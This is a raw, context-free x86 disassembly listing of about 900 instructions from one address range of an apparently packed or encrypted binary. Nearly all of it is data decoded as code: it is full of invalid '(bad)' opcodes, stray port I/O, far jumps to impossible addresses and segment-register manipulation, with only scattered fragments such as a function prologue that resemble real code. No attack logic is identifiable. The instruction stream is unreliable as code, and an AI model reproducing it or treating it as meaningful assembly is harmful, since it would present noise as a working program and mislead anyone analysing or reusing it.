  40f8fb:	inc    ebp
  40f8fc:	enter  0xbe84,0x80
  40f900:	push   0xffffffc7
  40f902:	pop    eax
  40f903:	stc    
  40f904:	push   ss
  40f905:	push   ebp
  40f906:	jnp    0x40f983
  40f908:	lods   eax,DWORD PTR ds:[esi]
  40f909:	pushf  
  40f90a:	sub    al,0xef
  40f90c:	(bad)  
  40f90d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f90e:	mov    ecx,0xd0123f99
  40f913:	shl    DWORD PTR [edi],1
  40f915:	adc    al,bh
  40f917:	in     eax,dx
  40f918:	dec    esp
  40f919:	jns    0x40f97b
  40f91b:	imul   ebp,DWORD PTR [edx+0x26d80929],0x16038c97
  40f925:	push   edi
  40f926:	mov    eax,0x2806ffea
  40f92b:	inc    edx
  40f92c:	sbb    cl,BYTE PTR [edx]
  40f92e:	inc    ebx
  40f92f:	push   0xfffffffc
  40f931:	or     eax,0xb1bb2e80
  40f936:	or     eax,0x327ce020
  40f93b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f93c:	or     cl,BYTE PTR [esi-0x7582fbe1]
  40f942:	repz jge 0x40f935
  40f945:	adc    edi,ecx
  40f947:	mov    ds:0xe0b1a080,eax
  40f94c:	xor    DWORD PTR [ecx],0x716259ee
  40f952:	cmc    
  40f953:	pop    esi
  40f954:	xchg   BYTE PTR [edx+ebp*2-0xb76557f],cl
  40f95b:	inc    eax
  40f95c:	in     al,0x6f
  40f95e:	mov    ebp,0xf3c69a14
  40f963:	imul   edi,DWORD PTR [esi+edi*8+0x784c479d],0x26
  40f96b:	(bad)  
  40f96c:	xchg   edi,eax
  40f96d:	(bad)  
  40f96e:	jmp    0x40f9d6
  40f970:	sub    cl,BYTE PTR [ecx+0x7dc7f594]
  40f976:	std    
  40f977:	(bad)  
  40f979:	ret    
  40f97a:	jl     0x40f9b0
  40f97c:	and    eax,0xd13a871e
  40f981:	dec    esi
  40f982:	shl    DWORD PTR [ebx+0x18e78782],0xaa
  40f989:	inc    DWORD PTR [ebp-0x71]
  40f98c:	test   BYTE PTR [esi+0x72fba7ce],bh
  40f992:	fidiv  WORD PTR [ecx-0x357b9502]
  40f998:	loope  0x40fa14
  40f99a:	push   ebx
  40f99b:	inc    ebx
  40f99c:	adc    DWORD PTR [ebp-0x4f3dbc39],ecx
  40f9a2:	fistp  DWORD PTR [edi]
  40f9a4:	in     al,0xf8
  40f9a6:	add    al,0x84
  40f9a8:	cmp    eax,0xfe68a6af
  40f9ad:	icebp  
  40f9ae:	mov    BYTE PTR [edi],bl
  40f9b0:	sub    esp,ebp
  40f9b2:	push   ds
  40f9b3:	fstp   TBYTE PTR [ebp+0x1f]
  40f9b6:	(bad)  
  40f9b7:	sub    eax,DWORD PTR [eax+0x35]
  40f9ba:	inc    esi
  40f9bb:	(bad)  
  40f9bc:	std    
  40f9bd:	add    edx,ebx
  40f9bf:	ins    BYTE PTR es:[edi],dx
  40f9c0:	mov    ebx,0xa6d3f3d2
  40f9c5:	js     0x40f9ed
  40f9c7:	mov    ch,ah
  40f9c9:	jo     0x40f9d8
  40f9cb:	jb     0x40f971
  40f9cd:	ficom  WORD PTR [edi]
  40f9cf:	iret   
  40f9d0:	(bad)  
  40f9d1:	fcmovu st,st(1)
  40f9d3:	cmp    al,0xa1
  40f9d5:	push   0xd9c485a7
  40f9da:	mov    dl,dh
  40f9dc:	jl     0x40f99d
  40f9de:	add    edi,DWORD PTR ds:0xd1149f13
  40f9e4:	mov    ch,0x7
  40f9e6:	and    eax,0x87a2cfc7
  40f9eb:	aad    0xa7
  40f9ed:	push   ebx
  40f9ee:	adc    BYTE PTR [esi+0x22],0xae
  40f9f2:	cmp    cl,BYTE PTR [esi-0x608b724d]
  40f9f8:	retf   
  40f9f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9fa:	push   ebx
  40f9fb:	and    DWORD PTR ds:0xf905aac7,esp
  40fa01:	cwde   
  40fa02:	jmp    0x6e7a6278
  40fa07:	cmp    eax,0xfa8aef36
  40fa0c:	(bad)  
  40fa0d:	in     eax,0x1c
  40fa0f:	ins    BYTE PTR es:[edi],dx
  40fa10:	and    bh,al
  40fa12:	clc    
  40fa13:	mov    ebx,edx
  40fa15:	fbstp  TBYTE PTR [ebp-0x7d]
  40fa18:	mov    edx,0x888d91b4
  40fa1d:	adc    DWORD PTR [ecx-0x4a],ebp
  40fa20:	jae    0x40fa4f
  40fa22:	(bad)  
  40fa23:	idiv   ebx
  40fa25:	dec    edi
  40fa26:	push   0xeced2d37
  40fa2b:	fsub   DWORD PTR [edi-0x3]
  40fa2e:	pmuludq mm2,mm5
  40fa31:	cmp    DWORD PTR [esi],eax
  40fa33:	jnp    0x40f9eb
  40fa35:	xor    BYTE PTR [esi+0x7e],ch
  40fa38:	cmc    
  40fa39:	sub    al,0x6d
  40fa3b:	add    ebp,DWORD PTR [edx+0x20c01b0d]
  40fa41:	out    dx,eax
  40fa42:	push   0xa6e596c5
  40fa47:	mov    ebp,0xadb7b217
  40fa4c:	pushf  
  40fa4d:	(bad)  
  40fa4e:	aaa    
  40fa4f:	jg     0x40fa42
  40fa51:	enter  0x30c8,0x59
  40fa55:	aaa    
  40fa56:	xchg   ebp,eax
  40fa57:	imul   edi,DWORD PTR [ebp-0x12],0x27
  40fa5b:	pop    ds
  40fa5c:	das    
  40fa5d:	call   0xae31:0x772ceea7
  40fa64:	fdivr  QWORD PTR [esi-0x6f]
  40fa67:	mov    esi,0x5df4a2ff
  40fa6c:	(bad)  [ecx]
  40fa6e:	gs jge 0x40f9f1
  40fa71:	push   ebp
  40fa72:	pop    ebp
  40fa73:	lods   eax,DWORD PTR ds:[esi]
  40fa74:	and    edi,eax
  40fa76:	icebp  
  40fa77:	mov    al,0xdc
  40fa79:	sub    al,BYTE PTR [esi+0x7c8d8f20]
  40fa7f:	adc    BYTE PTR [eax],ah
  40fa81:	shr    eax,cl
  40fa83:	call   0xeb50:0x3cf37ddb
  40fa8a:	sub    eax,0xccb1f070
  40fa8f:	das    
  40fa90:	sbb    edx,DWORD PTR [ebx-0x617ba0df]
  40fa96:	jns    0x40fa1b
  40fa98:	xlat   BYTE PTR ds:[ebx]
  40fa99:	mov    bh,0xda
  40fa9b:	int3   
  40fa9c:	outs   dx,DWORD PTR ds:[esi]
  40fa9d:	mov    al,ds:0x69869b82
  40faa2:	mov    bh,al
  40faa4:	out    dx,al
  40faa5:	nop
  40faa6:	mov    ebx,0x6989adae
  40faab:	jle    0x40fa72
  40faad:	and    BYTE PTR [esi],cl
  40faaf:	fmul   QWORD PTR [edi+0x76]
  40fab2:	data16 jb 0x40fabe
  40fab5:	mov    edi,ds
  40fab7:	pop    edx
  40fab8:	popa   
  40fab9:	popa   
  40faba:	outs   dx,DWORD PTR ds:[esi]
  40fabb:	mov    cl,0x6e
  40fabd:	and    ebp,esi
  40fabf:	daa    
  40fac0:	test   al,0x13
  40fac2:	aaa    
  40fac3:	arpl   WORD PTR [ebx+0x677a859f],si
  40fac9:	and    eax,0x51ccf075
  40face:	lock and bh,BYTE PTR [esi]
  40fad1:	les    eax,FWORD PTR [ecx-0x53]
  40fad4:	and    BYTE PTR [edi-0x11],ch
  40fad7:	pop    edx
  40fad8:	mov    ah,0xc6
  40fada:	or     esp,eax
  40fadc:	jg     0x40fb13
  40fade:	sub    eax,0x96373fbc
  40fae3:	mov    edx,DWORD PTR [ebp+0x7edb682f]
  40fae9:	retf   0xd2e9
  40faec:	and    BYTE PTR [edi-0x738a49c3],al
  40faf2:	sub    DWORD PTR [esi-0x63],ebx
  40faf5:	or     eax,DWORD PTR [eax-0x33dc4dd4]
  40fafb:	sub    BYTE PTR [edx],ah
  40fafd:	pop    ds
  40fafe:	mov    dl,0xc3
  40fb00:	cmp    al,0x11
  40fb02:	lea    ebp,[ecx]
  40fb04:	gs jne 0x40fb1e
  40fb07:	cld    
  40fb08:	ffreep st(5)
  40fb0a:	xor    BYTE PTR [edi],ah
  40fb0c:	mov    DWORD PTR [edi],ebx
  40fb0e:	cmp    eax,0xca981f3f
  40fb13:	push   esp
  40fb14:	cmc    
  40fb15:	fiadd  DWORD PTR gs:[edi]
  40fb18:	clc    
  40fb19:	inc    ebp
  40fb1a:	pop    ds
  40fb1b:	mov    ebx,0xe94ffae1
  40fb20:	cmp    DWORD PTR [eax],edi
  40fb22:	mov    ecx,0xbbaaec2f
  40fb27:	sar    DWORD PTR [ecx-0x73d75e4a],cl
  40fb2d:	dec    edx
  40fb2e:	in     eax,0xf5
  40fb30:	mov    dl,0xbd
  40fb32:	mov    cl,0xac
  40fb34:	mov    ecx,0xbecaecc
  40fb39:	in     eax,0x41
  40fb3b:	xchg   ebx,eax
  40fb3c:	inc    ecx
  40fb3d:	cmc    
  40fb3e:	sti    
  40fb3f:	xor    BYTE PTR [esi],dh
  40fb41:	pop    ebx
  40fb42:	and    DWORD PTR [eax],ebp
  40fb44:	pop    esp
  40fb45:	jmp    0x9257655a
  40fb4a:	leave  
  40fb4b:	not    BYTE PTR [esi+0x77]
  40fb4e:	or     eax,0x958fb904
  40fb53:	ret    0x3633
  40fb56:	(bad)  
  40fb58:	push   edi
  40fb59:	pop    es
  40fb5a:	stc    
  40fb5b:	and    al,0xfe
  40fb5d:	nop
  40fb5e:	fstp   TBYTE PTR [edi+0x69a73224]
  40fb64:	mov    esp,0xa165d3ae
  40fb69:	inc    edx
  40fb6a:	scas   al,BYTE PTR es:[edi]
  40fb6b:	(bad)  
  40fb6c:	push   edi
  40fb6d:	cmp    al,bh
  40fb6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb70:	jecxz  0x40fb88
  40fb72:	cmp    DWORD PTR ds:[edx-0x2ce26413],eax
  40fb79:	push   esi
  40fb7a:	xor    ecx,DWORD PTR [eax-0x29]
  40fb7d:	mov    WORD PTR [esi-0x6d19e42],?
  40fb83:	push   ebx
  40fb84:	jno    0x40fb94
  40fb86:	adc    edx,esi
  40fb88:	and    al,0xa0
  40fb8a:	stc    
  40fb8b:	out    dx,eax
  40fb8c:	pop    ecx
  40fb8d:	add    al,0x19
  40fb8f:	mov    bh,BYTE PTR [eax+0x37]
  40fb92:	repz pushfw 
  40fb95:	adc    BYTE PTR [edx+0x12],ah
  40fb98:	int    0xc0
  40fb9a:	mov    esp,0x9be023c4
  40fb9f:	dec    edi
  40fba0:	jmp    0x79c70b5a
  40fba5:	stc    
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffffd7
  40fbc9:	call   0xb7112cdc
  40fbce:	jle    0x40fc4e
  40fbd0:	jl     0x40fc4f
  40fbd2:	jle    0x40fc52
  40fbd4:	push   edi
  40fbd5:	dec    ebx
  40fbd6:	push   0x5f
  40fbd8:	pushf  
  40fbd9:	test   eax,0x42467b9b
  40fbde:	mov    al,0xf2
  40fbe0:	push   eax
  40fbe1:	cdq    
  40fbe2:	push   edx
  40fbe3:	or     BYTE PTR cs:[eax-0x4d],dh
  40fbe7:	xchg   esp,eax
  40fbe8:	lock mov cl,0x8e
  40fbeb:	lods   al,BYTE PTR ds:[esi]
  40fbec:	ins    DWORD PTR es:[edi],dx
  40fbed:	mov    edi,0xdf886874
  40fbf2:	xchg   BYTE PTR [esi+esi*1-0x417fca28],dl
  40fbf9:	aaa    
  40fbfa:	push   esi
  40fbfb:	adc    eax,DWORD PTR [ecx]
  40fbfd:	xchg   ebx,eax
  40fbfe:	pop    edx
  40fbff:	push   0xa7f358ed
  40fc04:	je     0x40fbd7
  40fc06:	into   
  40fc07:	loop   0x40fba0
  40fc09:	addr16 in eax,0xba
  40fc0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc0d:	int    0x83
  40fc0f:	out    0xe0,al
  40fc11:	and    ebx,DWORD PTR [ecx+0x7a]
  40fc14:	out    dx,eax
  40fc15:	push   ebx
  40fc16:	repnz and ch,BYTE PTR [ecx]
  40fc19:	pushf  
  40fc1a:	(bad)  
  40fc1c:	and    BYTE PTR [edi+esi*2+0x46],0xb2
  40fc21:	ret    
  40fc22:	fld    DWORD PTR [eax+0x1b9af169]
  40fc28:	and    eax,0xef35de0c
  40fc2d:	fwait
  40fc2e:	inc    esp
  40fc2f:	popf   
  40fc30:	dec    edi
  40fc31:	and    al,0x81
  40fc33:	mov    ebx,0x940fb2b1
  40fc38:	mov    edi,0x728e1ea6
  40fc3d:	cdq    
  40fc3e:	sar    BYTE PTR [edi],1
  40fc40:	xchg   esp,eax
  40fc41:	das    
  40fc42:	ds jl  0x40fc7f
  40fc45:	mov    ebp,0xde8b0ea4
  40fc4a:	(bad)  
  40fc4b:	out    dx,eax
  40fc4c:	push   eax
  40fc4d:	dec    ecx
  40fc4e:	lods   eax,DWORD PTR ds:[esi]
  40fc4f:	add    al,0x41
  40fc51:	pop    edi
  40fc52:	mov    cs,WORD PTR [edx+0x10]
  40fc55:	cmp    al,0xe
  40fc57:	sub    eax,0x55c8ec7d
  40fc5c:	and    edi,DWORD PTR [edx+ebp*1-0x72a0654f]
  40fc63:	rcr    BYTE PTR [ebx-0x6ae13a53],1
  40fc69:	call   0xb083:0xd7f5687a
  40fc70:	fldenv [ecx]
  40fc72:	(bad)  
  40fc73:	pop    ss
  40fc74:	dec    ecx
  40fc75:	sub    esp,ebp
  40fc77:	aaa    
  40fc78:	outs   dx,DWORD PTR ds:[esi]
  40fc79:	cli    
  40fc7a:	add    DWORD PTR [ebp-0x56],edi
  40fc7d:	pop    ebx
  40fc7e:	mov    cl,BYTE PTR [esi]
  40fc80:	mov    al,ds:0x8815399c
  40fc85:	add    BYTE PTR [eax+edi*2],al
  40fc88:	popa   
  40fc89:	mov    dh,0xa2
  40fc8b:	adc    BYTE PTR [eax],ah
  40fc8d:	popa   
  40fc8e:	sti    
  40fc8f:	test   dh,ch
  40fc91:	fstp   DWORD PTR [eax+0x77]
  40fc94:	push   edi
  40fc95:	cld    
  40fc96:	jg     0x40fcf1
  40fc98:	pop    ds
  40fc99:	pop    edi
  40fc9a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40fc9c:	pop    ebx
  40fc9d:	sbb    DWORD PTR [esi+0x618f9e5a],ecx
  40fca3:	popa   
  40fca4:	push   0xffffff97
  40fca6:	pop    eax
  40fca7:	jl     0x40fcb7
  40fca9:	cld    
  40fcaa:	or     dl,al
  40fcac:	xchg   ebp,eax
  40fcad:	in     al,dx
  40fcae:	add    eax,0x48f4a9c
  40fcb3:	ret    
  40fcb4:	je     0x40fc7d
  40fcb6:	data16 (bad) 
  40fcb8:	addr16 pushf 
  40fcba:	mov    ds:0xf553a616,al
  40fcbf:	ret    
  40fcc0:	aas    
  40fcc1:	pop    esp
  40fcc2:	mov    fs,WORD PTR [edx-0x3]
  40fcc5:	fwait
  40fcc6:	inc    edi
  40fcc7:	xor    ecx,DWORD PTR [edx]
  40fcc9:	iret   
  40fcca:	(bad)  
  40fccb:	cmp    DWORD PTR [edx-0x17c95933],esp
  40fcd1:	and    eax,0x6cdc911a
  40fcd6:	dec    di
  40fcd8:	lahf   
  40fcd9:	icebp  
  40fcda:	rcr    esi,1
  40fcdc:	in     eax,dx
  40fcdd:	mov    ebx,0xe971d8d8
  40fce2:	pop    es
  40fce3:	setnp  cl
  40fce6:	fs ret 0xb41d
  40fcea:	pop    DWORD PTR [ebp-0x67ccefcd]
  40fcf0:	and    BYTE PTR ds:[ebp-0x5753e66c],0xa4
  40fcf8:	aas    
  40fcf9:	data16 (bad) 
  40fcfb:	stc    
  40fcfc:	and    esp,eax
  40fcfe:	mov    esp,0xd8ccc95b
  40fd03:	ja     0x40fd22
  40fd05:	inc    ebx
  40fd06:	aad    0x6f
  40fd08:	sub    eax,0x4f26bac5
  40fd0d:	ja     0x40fccb
  40fd0f:	and    ebp,DWORD PTR [esi]
  40fd11:	iret   
  40fd12:	mov    ds,WORD PTR [eax-0x18]
  40fd15:	iret   
  40fd16:	rcl    al,1
  40fd18:	sub    BYTE PTR [esi+0x59],bl
  40fd1b:	xor    al,BYTE PTR [ecx]
  40fd1d:	xor    eax,esi
  40fd1f:	pop    edx
  40fd20:	jl     0x40fd5c
  40fd22:	inc    ebp
  40fd23:	dec    edx
  40fd24:	iret   
  40fd25:	lock sub eax,0xb11db562
  40fd2b:	adc    al,ch
  40fd2d:	(bad)  
  40fd2e:	std    
  40fd2f:	(bad)  
  40fd30:	sbb    edx,DWORD PTR ds:0xef354adc
  40fd36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd37:	call   0x6d71:0x2ed5e633
  40fd3e:	repz repnz inc eax
  40fd41:	jp     0x40fd99
  40fd43:	fstp   QWORD PTR [eax]
  40fd45:	xor    DWORD PTR [ebx-0x7a],edi
  40fd48:	out    0x8b,eax
  40fd4a:	sub    BYTE PTR [ecx-0x6032c16d],dl
  40fd50:	add    BYTE PTR [eax],ch
  40fd52:	sbb    edx,DWORD PTR [ecx]
  40fd54:	mov    ds:0xf4f0addf,eax
  40fd59:	rcr    BYTE PTR [edi+0x4ed005fb],cl
  40fd5f:	dec    ebp
  40fd60:	add    ebp,DWORD PTR [ecx]
  40fd62:	adc    ebp,DWORD PTR [ebp+0x4fb34489]
  40fd68:	sbb    al,BYTE PTR [edx+edi*2-0x34]
  40fd6c:	cmp    ecx,ebx
  40fd6e:	outs   dx,DWORD PTR ds:[esi]
  40fd6f:	adc    dh,cl
  40fd71:	jecxz  0x40fd48
  40fd73:	jecxz  0x40fd40
  40fd75:	ret    0x6069
  40fd78:	clc    
  40fd79:	fldcw  WORD PTR [ecx+0x3381f124]
  40fd7f:	cmp    ebx,edi
  40fd81:	out    dx,al
  40fd82:	adc    al,0xa0
  40fd84:	ret    0x63cf
  40fd87:	add    eax,0xda518c03
  40fd8c:	(bad)  
  40fd8d:	out    dx,eax
  40fd8e:	mov    dl,0xd7
  40fd90:	aaa    
  40fd91:	and    dl,BYTE PTR [eax]
  40fd93:	scas   eax,DWORD PTR es:[edi]
  40fd94:	shl    BYTE PTR [edi+ecx*1-0x217c6121],cl
  40fd9b:	call   0xc5b4:0x9b022481
  40fda2:	(bad)
  40fda6:	mov    eax,edx
  40fda8:	xor    DWORD PTR [di-0x22],edi
  40fdac:	sub    edi,ebx
  40fdae:	push   edi
  40fdaf:	inc    edx
  40fdb0:	std    
  40fdb1:	icebp  
  40fdb2:	mov    ecx,0x309b3b12
  40fdb7:	and    eax,DWORD PTR [ebx+0x3083d929]
  40fdbd:	jge    0x40fdf3
  40fdbf:	addr16 jp 0x40fdf1
  40fdc2:	hlt    
  40fdc3:	push   ebx
  40fdc4:	jo     0x40fdb7
  40fdc6:	sub    BYTE PTR [esi],cl
  40fdc8:	mov    eax,0xeb5fcfa8
  40fdcd:	xlat   BYTE PTR ds:[ebx]
  40fdce:	add    BYTE PTR [edx],0x10
  40fdd1:	push   ds
  40fdd2:	rcr    DWORD PTR [eax+edx*4-0x3e14073b],1
  40fdd9:	jns    0x40fddf
  40fddb:	inc    esp
  40fddc:	mov    edi,0xbe1b4d06
  40fde1:	add    ebp,DWORD PTR [ebp-0x492ae476]
  40fde7:	pushf  
  40fde8:	loop   0x40fdbb
  40fdea:	nop
  40fdeb:	and    eax,0x5cdc921e
  40fdf0:	jg     0x40fe43
  40fdf2:	aad    0x4c
  40fdf4:	mov    dh,0xaf
  40fdf6:	dec    eax
  40fdf7:	les    edx,FWORD PTR [ebx]
  40fdf9:	xor    BYTE PTR [eax+0x5b],al
  40fdfc:	arpl   WORD PTR [ebp-0x5cf9cba4],sp
  40fe02:	sub    ch,BYTE PTR [esi]
  40fe04:	loop   0x40fe83
  40fe06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe07:	retf   
  40fe08:	mov    bl,0x58
  40fe0a:	push   ss
  40fe0b:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40fe0d:	(bad)  
  40fe0e:	out    0xb0,eax
  40fe10:	cdq    
  40fe11:	pop    ss
  40fe12:	nop
  40fe13:	ret    
  40fe14:	jecxz  0x40fe15
  40fe16:	push   ds
  40fe17:	(bad)  
  40fe19:	push   esp
  40fe1a:	loop   0x40fe27
  40fe1c:	(bad)  
  40fe1d:	mov    ebx,0xa3edb94f
  40fe22:	data16 (bad) 
  40fe25:	inc    esp
  40fe26:	and    DWORD PTR [edi+eiz*4+0x34],eax
  40fe2a:	imul   BYTE PTR [edx]
  40fe2c:	in     al,dx
  40fe2d:	push   ds
  40fe2e:	or     edi,edi
  40fe30:	cli    
  40fe31:	in     al,0xe0
  40fe33:	scas   al,BYTE PTR es:[edi]
  40fe34:	mov    DWORD PTR [edx+0x5b86aaea],ecx
  40fe3a:	xchg   edx,eax
  40fe3b:	imul   ebp,DWORD PTR [ecx],0xa07af6fe
  40fe41:	outs   dx,BYTE PTR ds:[esi]
  40fe42:	test   BYTE PTR ds:0x75eebb02,0xa1
  40fe49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe4a:	ins    DWORD PTR es:[edi],dx
  40fe4b:	imul   ebx,DWORD PTR [eax-0x632a5bb3],0xffffffbc
  40fe52:	ret    
  40fe53:	jne    0x40fe01
  40fe55:	push   ds
  40fe56:	jb     0x40fe03
  40fe58:	xor    eax,0xa2a6183c
  40fe5d:	cmc    
  40fe5e:	sub    eax,DWORD PTR [ebp+0x203583ed]
  40fe64:	std    
  40fe65:	adc    dl,BYTE PTR [esi-0x55bcfb47]
  40fe6b:	xor    eax,DWORD PTR ds:0x8a8098ec
  40fe71:	cmc    
  40fe72:	(bad)
  40fe75:	xor    BYTE PTR [eax],bl
  40fe77:	mov    ds:0x8fc3fce7,eax
  40fe7c:	ret    
  40fe7d:	sbb    ah,ch
  40fe7f:	and    al,0x29
  40fe81:	mov    ds:0x785f48c9,eax
  40fe86:	xchg   DWORD PTR [ecx],ebx
  40fe88:	stos   BYTE PTR es:[edi],al
  40fe89:	dec    eax
  40fe8a:	gs mov eax,0x179d6137
  40fe90:	scas   al,BYTE PTR es:[edi]
  40fe91:	repnz mov ch,0xf3
  40fe94:	outs   dx,DWORD PTR ds:[esi]
  40fe95:	or     ch,bl
  40fe97:	push   es
  40fe98:	leave  
  40fe99:	mov    bh,0x52
  40fe9b:	jecxz  0x40fe79
  40fe9d:	xor    edi,DWORD PTR [ebp-0x536777d1]
  40fea3:	cmp    DWORD PTR [edx],esi
  40fea5:	clc    
  40fea6:	sbb    ax,0x3bc7
  40feaa:	and    eax,0x88b09de9
  40feaf:	ins    BYTE PTR es:[edi],dx
  40feb0:	or     eax,0xe89e77cc
  40feb5:	fisttp WORD PTR [ecx+0x19]
  40feb8:	hlt    
  40feb9:	xchg   ebx,eax
  40feba:	xchg   esp,eax
  40febb:	es cdq 
  40febd:	push   DWORD PTR [ecx]
  40febf:	cmp    BYTE PTR [esi-0xdd3e659],ch
  40fec5:	nop
  40fec6:	inc    edi
  40fec7:	mov    ch,0x31
  40fec9:	dec    esi
  40feca:	out    0x8b,al
  40fecc:	add    cl,BYTE PTR [edx-0x69af013d]
  40fed2:	pop    ds
  40fed3:	adc    BYTE PTR [ecx-0x4c],ah
  40fed6:	mov    eax,DWORD PTR [ebp+0xc]
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0xa8d94346
  40fef3:	cwde   
  40fef4:	inc    esp
  40fef5:	fidiv  WORD PTR [ebp+0x7d7c7e7e]
  40fefb:	jle    0x40ff7b
  40fefd:	(bad)  
  40fefe:	mov    bh,0x58
  40ff00:	cmp    bh,BYTE PTR [ecx+0x1b879ca2]
  40ff06:	(bad)  
  40ff07:	lods   al,BYTE PTR ds:[esi]
  40ff08:	out    0x9e,al
  40ff0a:	mov    DWORD PTR [edi],edi
  40ff0c:	cmp    al,0x87
  40ff0e:	and    ah,BYTE PTR [edx+0x17fc7c01]
  40ff14:	mov    esp,0xcc15a740
  40ff19:	add    BYTE PTR [edx+0x4d],al
  40ff1c:	test   eax,0xe0b2f812
  40ff21:	jle    0x40ff59
  40ff23:	sub    eax,0xbf897321
  40ff28:	mov    WORD PTR [ebx+0x3a],gs
  40ff2b:	ins    BYTE PTR es:[edi],dx
  40ff2c:	cs dec ebx
  40ff2e:	jle    0x40feb0
  40ff30:	stos   BYTE PTR es:[edi],al
  40ff31:	cmp    esi,DWORD PTR [edx+0x23dfb850]
  40ff37:	into   
  40ff38:	cld    
  40ff39:	push   ecx
  40ff3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff3b:	ror    DWORD PTR [eax-0x160b3e3e],0x9c
  40ff42:	or     DWORD PTR [edx-0x69],eax
  40ff45:	aaa    
  40ff46:	popa   
  40ff47:	xchg   DWORD PTR [ebx-0x4f],ecx
  40ff4a:	test   edi,edi
  40ff4c:	pushf  
  40ff4d:	and    BYTE PTR [edx+0x22],dh
  40ff50:	mov    al,0x58
  40ff52:	pop    esi
  40ff53:	in     eax,dx
  40ff54:	mov    ah,0xb1
  40ff56:	cmp    ch,BYTE PTR [esi]
  40ff58:	imul   ebp,DWORD PTR [ecx],0x5c21ecf1
  40ff5e:	in     al,dx
  40ff5f:	sbb    ebx,DWORD PTR [ecx]
  40ff61:	js     0x40fee7
  40ff63:	add    edx,ebp
  40ff65:	dec    ecx
  40ff66:	mov    esp,0x489bd7ac
  40ff6b:	aaa    
  40ff6c:	dec    edi
  40ff6d:	loop   0x40ff4d
  40ff6f:	and    al,0x40
  40ff71:	cmp    BYTE PTR [ecx+0x76ed1bf1],cl
  40ff77:	pop    ebx
  40ff78:	xor    al,0xbd
  40ff7a:	mov    edi,0x364ac3fd
  40ff7f:	out    dx,al
  40ff80:	cdq    
  40ff81:	mov    eax,ds:0xb758c127
  40ff86:	xchg   DWORD PTR [edi],ebx
  40ff88:	arpl   WORD PTR [ebx+eax*2+0x2f7a73da],bp
  40ff8f:	or     ah,BYTE PTR [edi]
  40ff91:	mov    cl,bl
  40ff93:	scas   al,BYTE PTR es:[edi]
  40ff94:	popa   
  40ff95:	into   
  40ff96:	dec    edi
  40ff97:	test   DWORD PTR [ebx],esp
  40ff99:	fld    TBYTE PTR [ecx+edi*2-0x28]
  40ff9d:	xchg   edi,eax
  40ff9e:	inc    edi
  40ff9f:	mov    dl,0xab
  40ffa1:	xchg   ebx,eax
  40ffa2:	in     al,0x8c
  40ffa4:	adc    dh,BYTE PTR [edi+0x29]
  40ffa7:	xor    bl,BYTE PTR [edi+0x18f6b36f]
  40ffad:	sub    al,0x39
  40ffaf:	outs   dx,BYTE PTR ds:[esi]
  40ffb0:	xchg   esi,eax
  40ffb1:	and    DWORD PTR [ebp+0x3ecefeb2],0x68abb989
  40ffbb:	or     DWORD PTR [edi-0x4bd05178],esi
  40ffc1:	mov    esp,0xce7b2ffd
  40ffc6:	pop    es
  40ffc7:	jg     0x410010
  40ffc9:	(bad)  
  40ffca:	out    dx,eax
  40ffcb:	es push edi
  40ffcd:	sar    DWORD PTR [ecx+ebx*2],cl
  40ffd0:	sbb    bl,BYTE PTR [edx]
  40ffd2:	sub    edx,DWORD PTR [edi]
  40ffd4:	or     al,0xd8
  40ffd6:	mov    dh,0xcf
  40ffd8:	mov    dl,0x4
  40ffda:	xchg   ebp,eax
  40ffdb:	dec    edx
  40ffdc:	ret    0xe00b
  40ffdf:	in     eax,0xce
  40ffe1:	(bad)  
  40ffe2:	imul   esp,edi,0xffffffb5
  40ffe5:	mov    ch,0x16
  40ffe7:	imul   ebp,DWORD PTR [ebp-0x5a6c910f],0x5
  40ffee:	retfw  0x4711
  40fff2:	dec    eax
  40fff3:	div    BYTE PTR [ecx-0x16a0486d]
  40fff9:	sub    eax,0xffe6ec2c
  40fffe:	mov    bh,0xba
  410000:	push   esi
  410001:	or     eax,DWORD PTR [ecx-0x74]
  410004:	mov    ch,0x6d
  410006:	dec    edx
  410007:	mov    al,ds:0xe4618922
  41000c:	sti    
  41000d:	lds    esp,FWORD PTR [esi]
  41000f:	jns    0x41003b
  410011:	into   
  410012:	and    eax,0xdbd26579
  410017:	pusha  
  410018:	out    0x23,eax
  41001a:	adc    DWORD PTR [edx+ebp*8-0x3a],edi
  41001e:	mov    DWORD PTR [ebp+0x75a5e3ca],ecx
  410024:	test   al,0x5c
  410026:	xchg   ecx,eax
  410027:	xchg   esp,eax
  410028:	sbb    esi,DWORD PTR [edx]
  41002a:	mov    bh,0xac
  41002c:	push   cs
  41002d:	xchg   edi,eax
  41002e:	inc    ebp
  41002f:	xchg   ebp,eax
  410030:	adc    edi,DWORD PTR [ebp+0x10eaf6f9]
  410036:	sahf   
  410037:	mov    al,0x4
  410039:	into   
  41003a:	into   
  41003b:	xor    al,0xe7
  41003d:	add    eax,0x5884e5be
  410042:	daa    
  410043:	fwait
  410044:	jmp    0xb56d:0xe707a479
  41004b:	jle    0x4100a2
  41004d:	test   al,0xdd
  41004f:	lock or edi,DWORD PTR [edi+0x2b279802]
  410056:	adc    esi,DWORD PTR [ecx-0x215a8d09]
  41005c:	mov    edi,0x84c5fc3e
  410061:	shr    BYTE PTR [ebp+0x1c],1
  410064:	pop    edi
  410065:	pop    ebx
